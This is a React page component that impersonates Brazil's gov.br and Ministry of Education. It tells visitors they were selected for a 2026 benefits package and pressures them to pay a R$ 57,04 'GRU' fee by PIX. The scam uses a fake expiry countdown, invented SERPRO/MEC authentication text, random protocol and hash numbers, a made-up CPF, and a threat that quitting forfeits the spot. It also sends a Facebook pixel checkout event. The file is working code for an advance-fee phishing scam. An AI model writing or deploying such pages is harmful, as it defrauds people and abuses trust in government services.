import { useEffect, useMemo, useState } from 'react'
import { useNavigate } from 'react-router-dom'
import GovHeader from '../components/gov/GovHeader.jsx'
import GovFooter from '../components/gov/GovFooter.jsx'

const GOV_LOGO = 'https://www.gov.br/++theme++padrao_govbr/img/govbr-colorido-b.png'

const BENEFITS = [
  {
    num: '01',
    icon: 'bg-indigo-100 text-indigo-800',
    title: 'text-indigo-800',
    name: 'BOLSA AUXÍLIO MENSAL',
    desc: 'Ajuda de custo variável entre R$ 1.200 a R$ 1.800/mês para despesas logísticas.',
  },
  {
    num: '02',
    icon: 'bg-green-100 text-green-800',
    title: 'text-green-700',
    name: 'KIT CONEXÃO GLOBAL',
    desc: 'Cartão SIM (Chip) internacional com 20GB de dados e ligações ilimitadas.',
  },
  {
    num: '03',
    icon: 'bg-purple-100 text-purple-800',
    title: 'text-purple-700',
    name: 'WORKSHOP DE IA 2026',
    desc: 'Curso preparatório avançado de Inteligência Artificial e Programação.',
  },
  {
    num: '04',
    icon: 'bg-rose-100 text-rose-800',
    title: 'text-rose-700',
    name: 'SEGURO SAÚDE PREMIUM',
    desc: 'Cobertura integral de até $50k dólares para emergências médicas do viajante.',
  },
]

const ITEMS = [
  { n: '1.', label: 'TAXA DE IMPRESSÃO DE MATERIAIS DE EXAME PRESENCIAL', val: 'R$ 14,20' },
  { n: '2.', label: 'REMUNERAÇÃO DOCENTE (APLICAÇÃO 3H FÍSICA)', val: 'R$ 18,50' },
  { n: '3.', label: 'KIT ALIMENTAÇÃO OFICIAL DA ESCOLA (SALGADO + SUCO)', val: 'R$ 12,00' },
  { n: '4.', label: 'LOGÍSTICA, AUDITORIA TÉCNICA E CUSTÓDIA', val: 'R$ 12,34' },
]

function randomHash() {
  const part = (len) =>
    Math.random().toString(36).substring(2, 2 + len).toUpperCase()
  return `${part(8)}-${part(4)}`
}

function randomCpf() {
  const rnd = () => Math.floor(100 + Math.random() * 899)
  return `${rnd()}.${rnd()}.${rnd()}-${Math.floor(10 + Math.random() * 89)}`
}

export default function Solicitacao() {
  const navigate = useNavigate()
  const [timeLeft, setTimeLeft] = useState(9 * 60 + 24)
  const [userName, setUserName] = useState('CANDIDATO NÃO IDENTIFICADO')
  const [school, setSchool] = useState('Unidade MEC Padrão')
  const [cpf, setCpf] = useState('')

  const protocol = useMemo(
    () =>
      `#${new Date().getFullYear()}-MEC-${Math.floor(
        100000 + Math.random() * 900000
      )}`,
    []
  )
  const hash = useMemo(() => randomHash(), [])

  useEffect(() => {
    document.body.classList.add('gov-body')
    return () => document.body.classList.remove('gov-body')
  }, [])

  useEffect(() => {
    const n = localStorage.getItem('user_name')
    const s = localStorage.getItem('exam_school')
    const c = localStorage.getItem('user_cpf')
    if (n) setUserName(n.toUpperCase())
    if (s) setSchool(s.toUpperCase())
    setCpf(c || randomCpf())
  }, [])

  useEffect(() => {
    const id = setInterval(() => {
      setTimeLeft((p) => (p > 0 ? p - 1 : 0))
    }, 1000)
    return () => clearInterval(id)
  }, [])

  const mm = String(Math.floor(timeLeft / 60)).padStart(2, '0')
  const ss = String(timeLeft % 60).padStart(2, '0')

  function handleIC() {
    if (typeof window !== 'undefined' && typeof window.fbq === 'function') {
      try {
        window.fbq('track', 'InitiateCheckout')
      } catch {}
    }
    navigate('/pagamento-pix')
  }

  function handleQuit() {
    if (
      window.confirm(
        'ATENÇÃO: Caso desista agora, sua vaga será repassada imediatamente para outra pessoa no Edital. Confirma a desistência permanente?'
      )
    ) {
      navigate('/')
    }
  }

  return (
    <div style={{ background: '#f2f5f7', minHeight: '100vh' }}>
      <GovHeader />

      <div className="container-gov">
        <div
          style={{
            display: 'flex',
            alignItems: 'center',
            gap: 8,
            padding: '25px 0 10px',
            fontSize: 14,
            color: '#1351b4',
          }}
        >
          <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
            <path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z" />
          </svg>
          <span>&gt;</span>
          <span className="text-gray-500">
            Expedição de Documento de Arrecadação (Guia GRU)
          </span>
        </div>

        <div
          style={{
            maxWidth: 850,
            margin: '0 auto 40px',
            padding: '20px 0',
            fontFamily: "'Montserrat', 'Rawline', sans-serif",
            textAlign: 'center',
          }}
        >
          {/* Success pill */}
          <div
            style={{
              backgroundColor: '#d1fae5',
              color: '#059669',
              padding: '8px 25px',
              borderRadius: 30,
              fontWeight: 900,
              fontSize: 15,
              display: 'inline-block',
              marginBottom: 25,
              letterSpacing: 0.5,
              boxShadow: '0 4px 6px rgba(5, 150, 105, 0.1)',
            }}
          >
            VAGA ALOCADA E ASSINADA COM SUCESSO
          </div>

          {/* Countdown */}
          <div
            className="bg-red-50 border-l-4 border-red-600 p-4 mb-6 mt-2 mx-auto rounded shadow-sm flex items-center justify-between text-left max-w-lg"
          >
            <div>
              <div className="font-black text-red-700 text-sm tracking-widest uppercase">
                Pagamento Pendente
              </div>
              <div className="text-[11px] text-red-900 font-bold mt-1">
                Conclua o pagamento para garantir a vaga definitiva.
              </div>
            </div>
            <div className="text-right ml-4">
              <div className="text-[9px] text-red-500 font-bold uppercase tracking-wider mb-1 whitespace-nowrap">
                A VAGA EXPIRA EM:
              </div>
              <div
                className="text-2xl font-black text-red-600 font-mono"
                style={{ letterSpacing: '-0.05em' }}
              >
                {mm}:{ss}
              </div>
            </div>
          </div>

          <h1
            style={{
              fontWeight: 900,
              color: '#1351b4',
              fontSize: 32,
              textTransform: 'uppercase',
              marginBottom: 30,
              letterSpacing: -1,
              lineHeight: 1.1,
            }}
          >
            PARABÉNS, VOCÊ FOI SELECIONADO!
          </h1>
          <div
            style={{
              fontWeight: 900,
              color: '#94a3b8',
              fontSize: 17,
              marginBottom: 20,
              letterSpacing: 1.5,
              textTransform: 'uppercase',
            }}
          >
            SEU PACOTE DE BENEFÍCIOS 2026
          </div>

          {/* Benefits */}
          <div
            style={{
              background: 'white',
              border: '1px solid #e2e8f0',
              borderRadius: 12,
              padding: 30,
              margin: '0 auto 30px',
              boxShadow: '0 4px 10px rgba(0,0,0,0.03)',
              textAlign: 'left',
            }}
          >
            {BENEFITS.map((b, i) => (
              <div
                key={b.num}
                style={{
                  display: 'flex',
                  alignItems: 'flex-start',
                  marginBottom: i === BENEFITS.length - 1 ? 0 : 20,
                }}
              >
                <div
                  className={b.icon}
                  style={{
                    width: 45,
                    height: 45,
                    borderRadius: '50%',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    fontWeight: 900,
                    fontSize: 18,
                    marginRight: 20,
                    flexShrink: 0,
                  }}
                >
                  {b.num}
                </div>
                <div>
                  <div
                    className={b.title}
                    style={{
                      fontWeight: 900,
                      fontSize: 14,
                      textTransform: 'uppercase',
                      marginBottom: 2,
                    }}
                  >
                    {b.name}
                  </div>
                  <div
                    style={{
                      fontSize: 13,
                      color: '#64748b',
                      fontWeight: 600,
                      lineHeight: 1.4,
                    }}
                  >
                    {b.desc}
                  </div>
                </div>
              </div>
            ))}
          </div>

          {/* Receipt / GRU */}
          <div
            style={{
              background: 'white',
              border: '4px solid #111',
              margin: '0 auto 35px',
              padding: 35,
              textAlign: 'left',
            }}
          >
            <div
              style={{
                display: 'flex',
                justifyContent: 'space-between',
                alignItems: 'center',
                borderBottom: '2px solid #111',
                paddingBottom: 20,
                marginBottom: 25,
              }}
            >
              <div className="flex items-center">
                <img
                  src={GOV_LOGO}
                  alt="gov.br"
                  style={{
                    height: 35,
                    marginRight: 15,
                    filter: 'grayscale(100%) brightness(0%)',
                    borderRight: '2px solid #ccc',
                    paddingRight: 15,
                  }}
                />
                <div>
                  <div style={{ fontSize: 10, fontWeight: 900, color: '#111', letterSpacing: 0.5 }}>
                    MINISTÉRIO DA EDUCAÇÃO
                  </div>
                  <div style={{ fontSize: 8, fontWeight: 900, color: '#111', letterSpacing: 0.5 }}>
                    SECRETARIA DE ENSINO SUPERIOR
                  </div>
                </div>
              </div>
              <div
                style={{
                  border: '3px solid #111',
                  padding: '4px 15px',
                  fontWeight: 900,
                  letterSpacing: 1,
                  fontSize: 16,
                  color: '#111',
                }}
              >
                GRU
              </div>
            </div>

            <ReceiptRow label="BENEFICIÁRIO DIPLOMADO:" value={userName} />
            <ReceiptRow label="DOCUMENTO CPF:" value={cpf} />
            <ReceiptRow
              label="ALOCAÇÃO FÍSICA DO EXAME:"
              value={school}
              valueStyle={{ color: '#1351b4' }}
            />
            <div
              style={{
                display: 'flex',
                justifyContent: 'space-between',
                alignItems: 'flex-end',
                marginBottom: 40,
                paddingBottom: 24,
                borderBottom: '2px dashed #d1d5db',
              }}
            >
              <span
                style={{
                  fontSize: 10,
                  color: '#888',
                  fontWeight: 800,
                  textTransform: 'uppercase',
                  letterSpacing: 1.5,
                  maxWidth: '40%',
                }}
              >
                PROTOCOLO DE SEGURANÇA:
              </span>
              <div
                style={{
                  flexGrow: 1,
                  borderBottom: '2px dotted #d1d5db',
                  margin: '0 15px',
                  position: 'relative',
                  top: -4,
                }}
              />
              <span
                style={{
                  fontSize: 14,
                  fontWeight: 900,
                  color: '#111',
                  textTransform: 'uppercase',
                  textAlign: 'right',
                  maxWidth: '55%',
                  wordBreak: 'break-word',
                }}
              >
                {protocol}
              </span>
            </div>

            {ITEMS.map((item) => (
              <div
                key={item.label}
                style={{
                  display: 'flex',
                  justifyContent: 'space-between',
                  marginBottom: 15,
                  fontSize: 11,
                  fontWeight: 800,
                  color: '#555',
                  textTransform: 'uppercase',
                  alignItems: 'baseline',
                }}
              >
                <span>{item.n} {item.label}</span>
                <div
                  style={{
                    flexGrow: 1,
                    borderBottom: '2px dotted #d1d5db',
                    margin: '0 15px',
                    position: 'relative',
                    top: -4,
                  }}
                />
                <span style={{ fontSize: 14, fontWeight: 900, color: '#111', whiteSpace: 'nowrap' }}>
                  {item.val}
                </span>
              </div>
            ))}

            <div
              style={{
                background: '#111',
                color: 'white',
                padding: '20px 25px',
                display: 'flex',
                justifyContent: 'space-between',
                alignItems: 'center',
                marginTop: 25,
                borderRadius: 4,
              }}
            >
              <span style={{ fontSize: 14, fontWeight: 900, letterSpacing: 1 }}>
                VALOR TOTAL DA GUIA (GRU)
              </span>
              <span style={{ fontSize: 28, fontWeight: 900 }}>R$ 57,04</span>
            </div>

            <div style={{ textAlign: 'center', marginTop: 25 }}>
              <div
                style={{
                  border: '1px solid #d1d5db',
                  padding: '8px 15px',
                  display: 'inline-block',
                  fontSize: 8,
                  color: '#9ca3af',
                  fontWeight: 800,
                  letterSpacing: 0.5,
                  lineHeight: 1.4,
                  borderRadius: 4,
                }}
              >
                AUTENTICADO VIA SERPRO/MEC V2.1
                <br />
                SISTEMA DE PAGAMENTOS DIGITAIS E INSTANTÂNEOS (PIX)
                <br />
                HASH T/ID: {hash}
              </div>
            </div>
          </div>

          <button
            onClick={handleIC}
            style={{
              backgroundColor: '#1351b4',
              color: 'white',
              padding: 20,
              borderRadius: 40,
              fontWeight: 900,
              width: '100%',
              display: 'block',
              textTransform: 'uppercase',
              fontSize: 16,
              letterSpacing: 0.5,
              border: 'none',
              cursor: 'pointer',
              boxShadow: '0 10px 15px rgba(19,81,180,0.2)',
            }}
          >
            EMITIR GUIA PIX E CONFIRMAR INSCRIÇÃO
          </button>

          <span
            onClick={handleQuit}
            style={{
              display: 'block',
              textAlign: 'center',
              marginTop: 20,
              fontSize: 10,
              fontWeight: 900,
              color: '#9ca3af',
              textDecoration: 'underline',
              letterSpacing: 1,
              cursor: 'pointer',
              textTransform: 'uppercase',
            }}
          >
            DESEJAR ABRIR MÃO DA VAGA (IRREVERSÍVEL)
          </span>
        </div>
      </div>

      <GovFooter logo={GOV_LOGO} />
    </div>
  )
}

function ReceiptRow({ label, value, valueStyle }) {
  return (
    <div
      style={{
        display: 'flex',
        justifyContent: 'space-between',
        alignItems: 'flex-end',
        marginBottom: 18,
      }}
    >
      <span
        style={{
          fontSize: 10,
          color: '#888',
          fontWeight: 800,
          textTransform: 'uppercase',
          letterSpacing: 1.5,
          maxWidth: '40%',
        }}
      >
        {label}
      </span>
      <div
        style={{
          flexGrow: 1,
          borderBottom: '2px dotted #d1d5db',
          margin: '0 15px',
          position: 'relative',
          top: -4,
        }}
      />
      <span
        style={{
          fontSize: 14,
          fontWeight: 900,
          color: '#111',
          textTransform: 'uppercase',
          textAlign: 'right',
          maxWidth: '55%',
          wordBreak: 'break-word',
          ...valueStyle,
        }}
      >
        {value}
      </span>
    </div>
  )
}
